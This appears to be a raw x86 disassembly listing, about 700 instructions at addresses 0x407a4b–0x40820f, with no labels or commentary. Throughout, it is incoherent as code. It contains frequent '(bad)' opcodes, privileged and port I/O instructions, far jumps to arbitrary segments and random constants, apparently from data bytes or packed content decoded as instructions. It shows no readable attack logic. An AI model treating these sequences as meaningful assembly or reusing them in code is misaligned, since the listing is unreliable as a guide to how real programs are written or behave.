  407a4b:	cmp    DWORD PTR [edi-0x7aa37b7c],eax
  407a51:	pop    ecx
  407a52:	mov    ebp,0xeb6a8a25
  407a57:	jl     0x407a9e
  407a59:	ret    0xd8ae
  407a5c:	inc    edi
  407a5d:	or     al,0xe3
  407a5f:	div    DWORD PTR [edi-0x20c582cd]
  407a65:	xchg   esi,eax
  407a66:	div    ah
  407a68:	inc    edx
  407a69:	mov    esp,0x23408968
  407a6e:	sbb    BYTE PTR es:[ebx-0x27],bh
  407a72:	sub    eax,DWORD PTR [eax+0x1e]
  407a75:	lods   eax,DWORD PTR ds:[esi]
  407a76:	mov    cl,0x4d
  407a78:	inc    edi
  407a79:	mov    cs,WORD PTR [ebx+0x323b634]
  407a7f:	add    al,0xf5
  407a81:	(bad)  
  407a82:	(bad)  
  407a83:	mov    ah,0xe6
  407a85:	(bad)  
  407a86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a87:	add    BYTE PTR [ebx+0x68],dh
  407a8a:	xchg   edi,eax
  407a8b:	add    BYTE PTR [esi+0x47],al
  407a8e:	aas    
  407a8f:	mov    ebx,0xa44eef47
  407a94:	js     0x407ae9
  407a96:	mov    eax,ds:0x31b67362
  407a9b:	and    al,0x2f
  407a9d:	dec    esi
  407a9e:	cdq    
  407a9f:	aad    0xb6
  407aa1:	adc    al,0x0
  407aa3:	and    eax,0xd1ec2674
  407aa8:	sbb    eax,0xbab8505a
  407aad:	push   ds
  407aae:	pop    ebx
  407aaf:	inc    esi
  407ab0:	ja     0x407aa9
  407ab2:	mov    dh,BYTE PTR [edx+0x22e47de8]
  407ab8:	sahf   
  407ab9:	stc    
  407aba:	add    eax,0x99d77702
  407abf:	push   edx
  407ac1:	ins    BYTE PTR es:[edi],dx
  407ac2:	(bad)  
  407ac3:	outs   dx,DWORD PTR ds:[esi]
  407ac4:	mov    al,ds:0x740125fc
  407ac9:	frstor [ebx]
  407acb:	pop    edx
  407acc:	arpl   di,dx
  407ace:	hlt    
  407acf:	js     0x407ad6
  407ad1:	pop    esp
  407ad2:	dec    eax
  407ad3:	sar    bh,1
  407ad5:	js     0x407ad6
  407ad7:	arpl   WORD PTR [ecx+0x40eb5ecb],si
  407add:	pop    ss
  407ade:	cmp    DWORD PTR [edi+0x352c69db],edx
  407ae4:	not    DWORD PTR [esi-0x1b61e6a7]
  407aea:	pop    esp
  407aeb:	dec    ebx
  407aec:	jbe    0xac98381e
  407af2:	pop    ds
  407af3:	mov    WORD PTR [ecx-0x67],ds
  407af6:	paddsw mm7,QWORD PTR [eax+0x10]
  407afa:	push   ecx
  407afb:	dec    esi
  407afc:	add    DWORD PTR [ebx],esi
  407afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407aff:	(bad)  
  407b00:	lods   al,BYTE PTR ds:[esi]
  407b01:	inc    eax
  407b02:	std    
  407b03:	std    
  407b04:	mov    dh,0x6f
  407b06:	jo     0x407ab0
  407b08:	cld    
  407b09:	mov    ds:0x5ee0a59d,al
  407b0e:	and    ch,cl
  407b10:	xchg   ebp,eax
  407b11:	cmp    eax,0xbe77d73d
  407b16:	call   0xbaf1:0x68348a60
  407b1d:	nop
  407b1e:	dec    ecx
  407b1f:	xchg   esi,eax
  407b20:	xchg   esi,eax
  407b21:	cmp    esi,eax
  407b23:	test   eax,0xc312215b
  407b28:	push   esp
  407b29:	push   ecx
  407b2a:	popw   ss
  407b2c:	ins    DWORD PTR es:[edi],dx
  407b2d:	(bad)  
  407b2e:	mov    esp,0xac4a32de
  407b33:	nop
  407b34:	loop   0x407b1f
  407b36:	sbb    al,0x65
  407b38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b39:	cmp    eax,0xbb4f9ea8
  407b3e:	inc    esp
  407b3f:	repnz shr bl,1
  407b42:	add    eax,0x6a538c75
  407b47:	dec    esi
  407b48:	test   BYTE PTR [ebx],cl
  407b4a:	enter  0xbc1a,0xe8
  407b4e:	sub    DWORD PTR [eax-0x3d],ebp
  407b51:	scas   al,BYTE PTR es:[edi]
  407b52:	pop    ebp
  407b53:	jnp    0x407b81
  407b55:	adc    eax,0x26d4350b
  407b5a:	sbb    al,0x88
  407b5c:	out    0xfd,al
  407b5e:	jb     0x407ba2
  407b60:	fwait
  407b61:	or     esi,DWORD PTR [ebp-0x4e]
  407b64:	jns    0x407ba3
  407b66:	sub    edx,edi
  407b68:	xor    BYTE PTR [edi-0x6b],dl
  407b6b:	mov    eax,ds:0xd6c59780
  407b70:	test   DWORD PTR [eax],edx
  407b72:	sbb    DWORD PTR [edi+0x51],ecx
  407b75:	(bad)  [ebp+0x56]
  407b78:	fbstp  TBYTE PTR [eax]
  407b7a:	xor    BYTE PTR [ebx+0x3fe9cd8e],0x3d
  407b81:	jne    0x407b3e
  407b83:	imul   edi
  407b85:	mov    bh,0xce
  407b87:	loope  0x407be0
  407b89:	dec    ebx
  407b8a:	fwait
  407b8b:	sbb    al,BYTE PTR fs:[ebx]
  407b8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b8f:	loop   0x407b7a
  407b91:	outs   dx,DWORD PTR ds:[esi]
  407b92:	iret   
  407b93:	mov    ebp,0xf0267c58
  407b98:	dec    esi
  407b99:	mov    dh,BYTE PTR [edx]
  407b9b:	daa    
  407b9c:	add    al,0x8d
  407b9e:	and    eax,0x6bc6ab9b
  407ba3:	lods   eax,DWORD PTR ds:[esi]
  407ba4:	ror    dl,cl
  407ba6:	pop    ebp
  407ba7:	mov    edx,0x636312dc
  407bac:	pop    edi
  407bad:	inc    esi
  407bae:	add    al,0xd3
  407bb0:	test   BYTE PTR [edi+0x623fbcdb],ch
  407bb6:	pop    edi
  407bb7:	pop    ds
  407bb8:	ja     0x407b42
  407bba:	pusha  
  407bbb:	or     bl,ah
  407bbd:	cmp    edx,DWORD PTR [ebx-0x7e82509]
  407bc3:	scas   al,BYTE PTR es:[edi]
  407bc4:	and    al,0x43
  407bc6:	sub    eax,0xab2f1c36
  407bcb:	push   esp
  407bcc:	pop    eax
  407bcd:	push   eax
  407bce:	inc    eax
  407bcf:	lods   al,BYTE PTR ds:[esi]
  407bd0:	jecxz  0x407bba
  407bd2:	jmp    0x407bf9
  407bd4:	data16 fnstcw WORD PTR [ebx+0x75]
  407bd8:	pop    edx
  407bd9:	addr16 mov edi,es
  407bdc:	ins    DWORD PTR es:[edi],dx
  407bdd:	lahf   
  407bde:	jecxz  0x407c10
  407be0:	fist   DWORD PTR cs:[ebx-0xe]
  407be4:	les    ecx,FWORD PTR [edx-0x34]
  407be7:	je     0x407b73
  407be9:	in     al,0x3a
  407beb:	adc    al,0x6e
  407bed:	bound  esi,QWORD PTR [ecx-0x7d67df80]
  407bf3:	pop    ebx
  407bf4:	pushf  
  407bf5:	adc    BYTE PTR [esi-0x24e423f0],cl
  407bfb:	out    0x82,al
  407bfd:	ds std 
  407bff:	js     0x407ba6
  407c01:	inc    edx
  407c02:	cmp    al,0x51
  407c04:	in     eax,dx
  407c05:	std    
  407c06:	xchg   BYTE PTR [ecx+0x5c],ah
  407c09:	adc    ch,BYTE PTR [ebp-0x11cf2190]
  407c0f:	mov    bl,0x56
  407c11:	dec    ecx
  407c12:	out    0x9b,al
  407c14:	fidivr WORD PTR ss:[ebx+0x24]
  407c18:	push   esp
  407c19:	ins    DWORD PTR es:[edi],dx
  407c1a:	std    
  407c1b:	popf   
  407c1c:	lods   al,BYTE PTR ds:[esi]
  407c1d:	pop    es
  407c1e:	add    ch,BYTE PTR [ecx+0x2ff54ce2]
  407c24:	jle    0x407c2b
  407c26:	lods   eax,DWORD PTR ds:[esi]
  407c27:	xlat   BYTE PTR ds:[ebx]
  407c28:	jg     0x407bed
  407c2a:	or     eax,0xb5bbedc3
  407c2f:	pop    ss
  407c30:	xchg   esi,eax
  407c31:	fs mov dh,0x19
  407c34:	and    BYTE PTR [edi],dl
  407c36:	add    BYTE PTR [esi],0x37
  407c39:	fidiv  DWORD PTR [ebx]
  407c3b:	push   ss
  407c3c:	ret    
  407c3d:	push   0xefb8177d
  407c42:	xor    bh,BYTE PTR [ebp-0x64aa42ad]
  407c48:	xor    eax,0x4681fdd5
  407c4d:	ins    BYTE PTR es:[edi],dx
  407c4e:	push   0x64
  407c50:	adc    al,0x65
  407c52:	cmp    BYTE PTR [eax-0x2e],ah
  407c55:	pushf  
  407c56:	js     0x407beb
  407c58:	lea    esi,[eax+0x2b72e912]
  407c5e:	into   
  407c5f:	and    edi,ebp
  407c61:	aad    0x5b
  407c63:	and    dh,ch
  407c65:	jl     0x407c15
  407c67:	dec    ebp
  407c68:	aam    0xfc
  407c6a:	dec    DWORD PTR [eax+0x1e]
  407c6d:	mov    ecx,DWORD PTR ds:0x29b87d91
  407c73:	inc    edi
  407c74:	cmp    eax,0xf2bd6a47
  407c79:	add    ah,BYTE PTR [edx+ecx*4]
  407c7c:	xor    DWORD PTR [edi+esi*4+0x7c21bd8d],esp
  407c83:	jae    0x407ccc
  407c85:	jne    0x407ce2
  407c87:	sub    ecx,DWORD PTR [ecx+0x38]
  407c8a:	mov    ss,WORD PTR [esi+0x36]
  407c8d:	or     bh,BYTE PTR [ebp-0x5a]
  407c90:	fcom   QWORD PTR [ecx-0x11d19a9a]
  407c96:	mov    ebp,DWORD PTR [eax]
  407c98:	enter  0xe7d8,0xfc
  407c9c:	and    al,0xe7
  407c9e:	sub    al,0x75
  407ca0:	popa   
  407ca1:	arpl   sp,dx
  407ca3:	push   cs
  407ca4:	pop    ss
  407ca5:	out    dx,al
  407ca6:	pop    ebp
  407ca7:	sub    al,0xc2
  407ca9:	mov    eax,0x9d680633
  407cae:	xor    eax,0x4bdaf390
  407cb3:	arpl   WORD PTR [ecx-0x5406ae17],sp
  407cb9:	cmp    eax,0x1b9d5ef8
  407cbe:	or     eax,0xed62853f
  407cc3:	adc    esp,ebx
  407cc5:	loop   0x407cab
  407cc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cc8:	imul   edi,DWORD PTR [edi-0x7a],0xffffffd5
  407ccc:	push   esi
  407ccd:	std    
  407cce:	aaa    
  407ccf:	xchg   ecx,eax
  407cd0:	popa   
  407cd1:	in     al,dx
  407cd2:	jns    0x407c80
  407cd4:	xchg   DWORD PTR [ebx-0x46b90374],ecx
  407cda:	mov    esp,ebx
  407cdc:	mov    ebx,0x576d1af1
  407ce1:	dec    esp
  407ce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ce3:	retf   
  407ce4:	lods   eax,DWORD PTR ds:[esi]
  407ce5:	pop    edi
  407ce6:	mov    bh,0x42
  407ce8:	adc    al,0x85
  407cea:	dec    esi
  407ceb:	into   
  407cec:	jae    0x407d4d
  407cee:	add    eax,esi
  407cf0:	jge    0x407cce
  407cf2:	ret    0x5747
  407cf5:	sbb    eax,0xf864e382
  407cfa:	test   eax,0x2592e863
  407cff:	xor    eax,0xee751424
  407d04:	jns    0x407ce3
  407d06:	je     0x407d47
  407d08:	or     ch,BYTE PTR [edi-0x44]
  407d0b:	add    BYTE PTR [esi+0x15],ah
  407d0e:	stos   DWORD PTR es:[edi],eax
  407d0f:	cmp    DWORD PTR [ebp-0x6],ebp
  407d12:	cwde   
  407d13:	mov    dh,0x4
  407d15:	inc    edx
  407d16:	xchg   edi,eax
  407d17:	push   0x3b
  407d19:	int3   
  407d1a:	push   cs
  407d1b:	mov    dl,0x6c
  407d1d:	retf   0x3379
  407d20:	mov    bh,0xa
  407d22:	in     eax,0x83
  407d24:	sub    eax,0x41508c1b
  407d29:	mov    WORD PTR [ebx],ss
  407d2b:	mov    ebp,0xc60055f1
  407d30:	and    BYTE PTR [edi],ah
  407d32:	ins    DWORD PTR es:[edi],dx
  407d33:	icebp  
  407d34:	and    DWORD PTR [ebx],ebp
  407d36:	ror    edi,cl
  407d38:	pop    edx
  407d39:	enter  0xfb89,0x99
  407d3d:	mov    ah,0x25
  407d3f:	or     dl,ah
  407d41:	jmp    0x5a2e:0x6090ea71
  407d48:	mov    esp,0x79bd9944
  407d4d:	xor    eax,DWORD PTR [ebp-0x11b80bca]
  407d53:	out    dx,al
  407d54:	div    dh
  407d56:	cmp    al,0x42
  407d58:	dec    DWORD PTR [ebx-0x32e1cec3]
  407d5e:	fldenv [ecx]
  407d60:	test   eax,0x45e289f0
  407d65:	fimul  DWORD PTR [esi+0x9]
  407d68:	ss shl bl,0x60
  407d6c:	and    eax,0xaa40e5ef
  407d71:	adc    dh,0x90
  407d74:	test   eax,edi
  407d76:	test   eax,0x795c7df1
  407d7b:	outs   dx,DWORD PTR ds:[esi]
  407d7c:	and    BYTE PTR ds:0xbae8f19f,al
  407d82:	aaa    
  407d83:	mov    ebx,0x958d2e43
  407d88:	mov    bh,0xc2
  407d8a:	clc    
  407d8b:	inc    ecx
  407d8c:	int3   
  407d8d:	(bad)  
  407d8e:	leave  
  407d8f:	mov    al,ds:0x6e198685
  407d94:	sti    
  407d95:	jnp    0x407d8f
  407d97:	cmp    al,0x6a
  407d99:	in     al,dx
  407d9a:	stos   DWORD PTR es:[edi],eax
  407d9b:	mov    ds,WORD PTR [ebp+eax*4+0x469d9bf5]
  407da2:	in     eax,dx
  407da3:	adc    edx,ebx
  407da5:	fbstp  TBYTE PTR [edx+0x61]
  407da8:	pop    ebx
  407da9:	clc    
  407daa:	data16 out dx,al
  407dac:	pushf  
  407dad:	aad    0x67
  407daf:	push   esi
  407db0:	out    dx,eax
  407db1:	and    esi,DWORD PTR [eax]
  407db3:	pop    eax
  407db4:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407db6:	gs add al,0x90
  407db9:	jb     0x407dc8
  407dbb:	pop    esp
  407dbc:	xchg   ebp,eax
  407dbd:	stos   DWORD PTR es:[edi],eax
  407dbe:	enter  0x222b,0x31
  407dc2:	test   eax,0x55e63743
  407dc7:	in     eax,dx
  407dc8:	mov    edi,0x7905176c
  407dcd:	dec    esi
  407dce:	push   es
  407dcf:	aas    
  407dd0:	stos   BYTE PTR es:[edi],al
  407dd1:	xchg   DWORD PTR [ebx-0x6d],edi
  407dd4:	pop    ebp
  407dd5:	arpl   si,ax
  407dd7:	lea    eax,[ebx+0x55]
  407dda:	and    al,0x34
  407ddc:	mov    al,0x99
  407dde:	data16 and al,0xa3
  407de1:	lods   al,BYTE PTR ds:[esi]
  407de2:	rcl    DWORD PTR [eax-0x2e],1
  407de5:	cmp    dl,bh
  407de7:	lea    esi,[esi-0x2af59bf2]
  407ded:	jmp    0x407e48
  407def:	mov    bl,cl
  407df1:	je     0x407e67
  407df3:	cmp    edi,ecx
  407df5:	rol    BYTE PTR [esi+edi*8],1
  407df8:	sbb    eax,0xd4c0692c
  407dfd:	mov    bl,0x36
  407dff:	xor    BYTE PTR [esi+0x76],bh
  407e02:	jmp    0x674c273b
  407e07:	push   es
  407e08:	push   edi
  407e09:	cmp    BYTE PTR [edx+0x10],al
  407e0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e0d:	fnop   
  407e0f:	les    esp,FWORD PTR [ebx-0x73b3afa]
  407e15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e17:	mov    eax,ds:0x17df3ebc
  407e1c:	sbb    cl,BYTE PTR [esi+0x15]
  407e1f:	mov    DWORD PTR ds:0xbc43df95,edi
  407e25:	dec    ebx
  407e26:	dec    esi
  407e27:	rol    BYTE PTR [esi+0x24],0x2a
  407e2b:	and    DWORD PTR [edi],ebx
  407e2d:	sbb    DWORD PTR gs:[ebp+0x4f076383],esi
  407e34:	out    0xa9,eax
  407e36:	lock inc ecx
  407e38:	xchg   esi,eax
  407e39:	loope  0x407de3
  407e3b:	out    0xc7,al
  407e3d:	sbb    ch,bh
  407e3f:	jnp    0x407e8f
  407e41:	mov    DWORD PTR [edx-0x13538c6c],0x20eca97a
  407e4b:	pushf  
  407e4c:	adc    cl,BYTE PTR [edi+0x25]
  407e4f:	inc    edx
  407e50:	adc    dl,bl
  407e52:	loopne 0x407e37
  407e54:	lods   al,BYTE PTR ds:[esi]
  407e55:	push   ecx
  407e56:	sti    
  407e57:	xchg   esi,eax
  407e58:	adc    al,0xc3
  407e5a:	stc    
  407e5b:	gs loopne 0x407eb9
  407e5e:	ret    
  407e5f:	mov    DWORD PTR [ecx],ecx
  407e61:	fwait
  407e62:	aaa    
  407e63:	add    BYTE PTR [ebx],ah
  407e65:	cmp    al,0xcb
  407e67:	jo     0x407e8f
  407e69:	ja     0x407df7
  407e6b:	push   0xffffff81
  407e6d:	cmp    eax,0x8260762a
  407e72:	push   ebx
  407e73:	aad    0x7b
  407e75:	dec    edx
  407e76:	test   BYTE PTR [eax+0xb94e52c],dl
  407e7c:	mov    ebx,0x4f62c4a1
  407e81:	mov    al,ds:0xa4379402
  407e86:	jno    0x407e5c
  407e88:	pop    ebp
  407e89:	test   al,0x86
  407e8b:	add    ebp,edi
  407e8d:	mov    ah,0x31
  407e8f:	adc    al,0xe4
  407e91:	ins    DWORD PTR es:[edi],dx
  407e92:	dec    esi
  407e93:	add    DWORD PTR ds:0xe4bd175,edi
  407e99:	ins    DWORD PTR es:[edi],dx
  407e9a:	sub    al,0xf1
  407e9c:	pop    edx
  407e9d:	inc    esp
  407e9e:	mov    bl,0xf6
  407ea0:	call   0xe6c:0x628976c3
  407ea7:	inc    ebx
  407ea8:	adc    dl,cl
  407eaa:	xor    eax,0xb771e6d6
  407eaf:	dec    ecx
  407eb0:	mov    esp,DWORD PTR [eax+eiz*8+0x2a]
  407eb4:	inc    eax
  407eb5:	test   eax,0x494f48d7
  407eba:	sbb    DWORD PTR [eax],ebp
  407ebc:	mov    esi,0x258bb64c
  407ec1:	and    eax,0x98685705
  407ec6:	arpl   WORD PTR [eax-0x4ed48da3],sp
  407ecc:	pop    ebp
  407ecd:	cmp    edi,ebp
  407ecf:	pop    ebx
  407ed0:	stos   DWORD PTR es:[edi],eax
  407ed1:	lds    esi,FWORD PTR [ebx]
  407ed3:	jecxz  0x407f05
  407ed5:	neg    eax
  407ed7:	xlat   BYTE PTR ds:[ebx]
  407ed8:	jp     0x407e8d
  407eda:	jecxz  0x407f33
  407edc:	push   edi
  407edd:	inc    esi
  407ede:	das    
  407edf:	pop    esp
  407ee0:	sbb    ah,BYTE PTR [esi+0x57]
  407ee3:	push   ecx
  407ee4:	in     eax,0xbd
  407ee6:	scas   al,BYTE PTR es:[edi]
  407ee7:	pop    esp
  407ee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ee9:	sbb    BYTE PTR [edx],al
  407eeb:	sub    eax,0x25d95f8
  407ef0:	pop    edi
  407ef1:	mov    cl,0xe9
  407ef3:	xor    BYTE PTR [eax+0x78e8e07a],0x9a
  407efa:	(bad)  
  407efb:	repz jo 0x407ebe
  407efe:	or     DWORD PTR ss:[ebx-0x7cc4a4d3],edi
  407f05:	push   0x5b02dc2b
  407f0a:	mov    edx,0xb140137a
  407f0f:	cdq    
  407f10:	ret    0x16f5
  407f13:	xchg   bh,dh
  407f15:	pop    esi
  407f16:	push   ebx
  407f17:	ins    BYTE PTR es:[edi],dx
  407f18:	and    bl,cl
  407f1a:	icebp  
  407f1b:	je     0x407efd
  407f1d:	cld    
  407f1e:	sbb    dh,ah
  407f20:	ja     0x407ec1
  407f22:	cli    
  407f23:	sti    
  407f24:	mov    eax,0xc05c886c
  407f29:	and    BYTE PTR [edi+0x28397ea8],dh
  407f2f:	mov    DWORD PTR [edx+0x34],0xfd5d20ac
  407f36:	sbb    ebp,DWORD PTR [ecx+0xfade652]
  407f3c:	and    DWORD PTR [edi],0x604e9d60
  407f42:	add    DWORD PTR [eax-0x6b4f6d5f],edx
  407f48:	mov    eax,0x913fbe5c
  407f4d:	jge    0x407f67
  407f4f:	jge    0x407f32
  407f51:	push   es
  407f52:	jns    0x407ee7
  407f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f55:	fistp  WORD PTR [ecx-0xac69ee6]
  407f5b:	iret   
  407f5c:	adc    al,BYTE PTR [ecx+eiz*4+0x5f4a8549]
  407f63:	jo     0x407ee7
  407f65:	xchg   edi,eax
  407f66:	popf   
  407f67:	xchg   ebx,eax
  407f68:	ins    BYTE PTR es:[edi],dx
  407f69:	pop    ss
  407f6a:	popa   
  407f6b:	bound  edi,QWORD PTR [ebp-0x7e]
  407f6e:	fs xchg ebp,eax
  407f70:	pop    eax
  407f71:	popf   
  407f72:	dec    edx
  407f73:	(bad)  [eax]
  407f75:	bound  edx,QWORD PTR [edi+0x38771aeb]
  407f7b:	push   eax
  407f7c:	test   eax,0x2870a7e8
  407f81:	xchg   esi,eax
  407f82:	pop    ebx
  407f83:	mov    BYTE PTR [edx],cl
  407f85:	xor    eax,0x8d08e284
  407f8a:	jb     0x407fc1
  407f8c:	sub    DWORD PTR [eax+0x34],ecx
  407f8f:	sbb    al,0xbc
  407f91:	pop    ds
  407f92:	cmp    al,0x92
  407f94:	lods   al,BYTE PTR gs:[esi]
  407f96:	test   eax,0x9a347cd4
  407f9b:	add    edi,DWORD PTR [esi+0x506041a1]
  407fa1:	pop    es
  407fa2:	out    0xf2,al
  407fa4:	xchg   ebx,eax
  407fa5:	retf   0x988c
  407fa8:	add    eax,0xe38793cc
  407fad:	ret    0xd9bd
  407fb0:	out    0xe6,eax
  407fb2:	outs   dx,BYTE PTR ds:[esi]
  407fb3:	in     eax,0xa1
  407fb5:	mov    esi,0x30f1a7ac
  407fba:	call   0x90f885ff
  407fbf:	xor    eax,edi
  407fc1:	enter  0x33e,0x94
  407fc5:	push   eax
  407fc6:	push   ds
  407fc7:	cli    
  407fc8:	sti    
  407fc9:	ficom  DWORD PTR ds:0x758c8aab
  407fcf:	sti    
  407fd0:	scas   eax,DWORD PTR es:[edi]
  407fd1:	pop    es
  407fd2:	loopne 0x407ff2
  407fd4:	xlat   BYTE PTR ds:[ebx]
  407fd5:	mov    esi,0x806ed59a
  407fda:	(bad)  
  407fdb:	push   0x1f
  407fdd:	fdiv   QWORD PTR [ebp+0x1bc89990]
  407fe3:	and    edi,DWORD PTR [ebx+0x29]
  407fe6:	mov    edx,0x5d68983c
  407feb:	int3   
  407fec:	xor    ebx,DWORD PTR [edx-0x3e22d3c9]
  407ff2:	out    0x4a,eax
  407ff4:	add    eax,0xf1c939d7
  407ff9:	push   es
  407ffa:	mov    dh,0xc5
  407ffc:	ret    0x70d0
  407fff:	mov    ds:0x7901c518,al
  408004:	cmp    al,0x3e
  408006:	mov    ds:0x2a1f9480,al
  40800b:	pop    edi
  40800c:	scas   al,BYTE PTR es:[edi]
  40800d:	fisttp WORD PTR [ebp-0x2cc63367]
  408013:	and    al,0xe8
  408015:	(bad)  
  408016:	out    dx,al
  408017:	call   0x6684db37
  40801c:	inc    BYTE PTR [ebx]
  40801e:	into   
  40801f:	xor    eax,DWORD PTR [eax+0x7a8d8503]
  408025:	lods   al,BYTE PTR ds:[esi]
  408026:	mov    ds:0xe794a9a5,al
  40802b:	jnp    0x408091
  40802d:	iret   
  40802e:	fnsave [edi]
  408030:	pop    ecx
  408031:	and    DWORD PTR [ebx+0x6b],ecx
  408034:	in     al,0x78
  408036:	stos   DWORD PTR es:[edi],eax
  408037:	sbb    BYTE PTR [ebx+edx*4+0x42547502],0x69
  40803f:	push   es
  408040:	mov    ebp,0x5bbc6562
  408045:	adc    al,0xa1
  408047:	push   ss
  408048:	rol    DWORD PTR [ebp+0x5c],0xbc
  40804c:	dec    ebp
  40804d:	sub    eax,0xc63867d8
  408052:	out    0xe8,eax
  408054:	rol    BYTE PTR [ebp-0x6d],0x38
  408058:	cmp    eax,0x32e48bfe
  40805d:	das    
  40805e:	mov    es,WORD PTR [ecx-0x53]
  408061:	and    cl,al
  408063:	mov    bl,0xc9
  408065:	imul   ecx,eax,0xb5698355
  40806b:	sbb    DWORD PTR [ecx+0x246d092a],eax
  408071:	cli    
  408072:	jae    0x408078
  408074:	popw   es
  408076:	in     eax,dx
  408077:	mov    al,ss:0x4ecc4af7
  40807d:	pushf  
  40807e:	xlat   BYTE PTR ds:[ebx]
  40807f:	dec    eax
  408080:	repnz rcl edi,cl
  408083:	xchg   esi,eax
  408084:	or     BYTE PTR [edi-0x694faea7],dl
  40808a:	sub    DWORD PTR [esi+esi*2-0x20bbddaa],0x217ab322
  408095:	adc    eax,0xbd443877
  40809a:	nop
  40809b:	mov    ecx,0xdff0c0bd
  4080a0:	fldenv [ecx-0x71]
  4080a3:	sbb    al,0xe4
  4080a5:	inc    eax
  4080a6:	inc    ebp
  4080a7:	mov    ebx,0x99f2c3f9
  4080ac:	inc    ebp
  4080ad:	jo     0x408049
  4080af:	fwait
  4080b0:	adc    al,0xf8
  4080b2:	jp     0x4080f7
  4080b4:	xchg   esi,eax
  4080b5:	push   esi
  4080b6:	(bad)  
  4080b8:	xchg   edi,eax
  4080b9:	fstp   DWORD PTR [ecx]
  4080bb:	or     DWORD PTR [ecx-0x5c8f9c02],ecx
  4080c1:	xchg   ebp,eax
  4080c2:	sbb    al,BYTE PTR [ecx+0x49]
  4080c5:	shr    BYTE PTR [esi-0x21],1
  4080c8:	xor    ch,BYTE PTR [edi+0x16ac7b9f]
  4080ce:	stc    
  4080cf:	mov    DWORD PTR [ecx+esi*2+0xb],edi
  4080d3:	jbe    0x408059
  4080d5:	mov    BYTE PTR [ebp+0x60],0xb8
  4080d9:	fist   DWORD PTR [ecx+0x22]
  4080dc:	nop
  4080dd:	dec    eax
  4080de:	ja     0x4080b2
  4080e0:	mov    esi,0xe537a9a4
  4080e5:	inc    ecx
  4080e6:	mov    esi,0xe8dab12
  4080eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080ec:	xchg   DWORD PTR [edx],eax
  4080ee:	pop    edi
  4080ef:	fnstsw WORD PTR [ebp+0x64]
  4080f2:	call   0x3494:0x6e7d17ac
  4080f9:	les    esi,FWORD PTR [ebx-0x27a9e53f]
  4080ff:	jns    0x40814d
  408101:	arpl   WORD PTR [edx+0x50],dx
  408104:	sbb    edi,ebx
  408106:	shl    BYTE PTR [esi],0x64
  408109:	or     al,0x7d
  40810b:	fs retf 
  40810d:	pusha  
  40810e:	cmp    eax,0xcb1d212d
  408113:	js     0x4080d3
  408115:	jp     0x4080b6
  408117:	shl    dl,0x4c
  40811a:	mov    ebp,0x1532073f
  40811f:	mov    edi,0xf6417339
  408124:	pop    ecx
  408125:	sub    al,0xe7
  408127:	jmp    0x48e6:0x510d68c7
  40812e:	inc    edi
  40812f:	leave  
  408130:	or     bl,BYTE PTR [edi-0x1d971b81]
  408136:	fucomp st(6)
  408138:	dec    edi
  408139:	cmp    eax,0x266b2cd6
  40813e:	cli    
  40813f:	xchg   esp,eax
  408140:	jmp    0x949c:0x673b63c8
  408147:	outs   dx,DWORD PTR ds:[esi]
  408148:	mov    ecx,0xe8c6ec07
  40814d:	dec    edi
  40814e:	inc    eax
  40814f:	das    
  408150:	int3   
  408151:	jp     0x4080e1
  408153:	pop    esi
  408154:	xchg   esp,eax
  408155:	dec    ebx
  408156:	fadd   QWORD PTR ds:0xfe91b67d
  40815c:	fs pushf 
  40815e:	push   esp
  40815f:	jo     0x4081bb
  408161:	dec    ebx
  408162:	cmp    eax,0xa5c871e3
  408167:	int3   
  408168:	mov    dh,0x2e
  40816a:	(bad)  
  40816b:	data16 adc BYTE PTR [edi+0x2a66a0f2],dl
  408172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408173:	mov    eax,ds:0xfdec9c4b
  408178:	scas   eax,DWORD PTR es:[edi]
  408179:	repnz retf 
  40817b:	or     al,0x29
  40817d:	imul   ebx,DWORD PTR [ecx+0x5a],0x44b6824d
  408184:	jp     0x408155
  408186:	icebp  
  408187:	adc    DWORD PTR [esp+edx*8+0x6],edi
  40818b:	adc    DWORD PTR [ebx+ebp*2],eax
  40818e:	xchg   al,dl
  408190:	inc    edi
  408191:	xor    dl,BYTE PTR [ebp+0x36c9414c]
  408197:	push   ss
  408198:	jbe    0x4081a4
  40819a:	push   ebp
  40819b:	inc    edi
  40819c:	sub    BYTE PTR [esi],ch
  40819e:	adc    edi,DWORD PTR [ebp+0x12520f02]
  4081a4:	sub    DWORD PTR [ecx+edx*2],ebp
  4081a7:	adc    ecx,ecx
  4081a9:	add    bh,cl
  4081ab:	out    0x7e,eax
  4081ad:	mov    esi,0x41eb341e
  4081b2:	retf   
  4081b3:	mov    dh,0x64
  4081b5:	ror    DWORD PTR [edx+0x7],1
  4081b8:	mov    ds:0x3b17a209,al
  4081bd:	js     0x408184
  4081bf:	repz les ebp,FWORD PTR [ebp-0x45]
  4081c3:	ret    
  4081c4:	shl    ah,0x83
  4081c7:	ins    DWORD PTR es:[edi],dx
  4081c8:	retf   0x1c75
  4081cb:	rcr    BYTE PTR [esp+edi*4-0x4],cl
  4081cf:	pop    ebp
  4081d0:	pop    ds
  4081d1:	xchg   esp,eax
  4081d2:	or     BYTE PTR ds:0x40f4ac6b,0x64
  4081d9:	pop    edx
  4081db:	jns    0x408241
  4081dd:	push   0x5b5716e
  4081e2:	xchg   edx,eax
  4081e3:	mov    esp,0x61aa17d9
  4081e8:	sub    eax,0x43244319
  4081ed:	add    DWORD PTR ds:0xc9990b76,ecx
  4081f3:	sub    BYTE PTR fs:[ebx],0xe1
  4081f7:	in     eax,0x6
  4081f9:	mov    db7,eax
  4081fc:	xor    esi,DWORD PTR cs:[edi]
  4081ff:	jne    0x40822a
  408201:	and    BYTE PTR [esp+ecx*8+0x52b0e047],0xba
  408209:	lds    ebp,FWORD PTR [esi-0x23372cb2]
  40820f:	dec    ebx
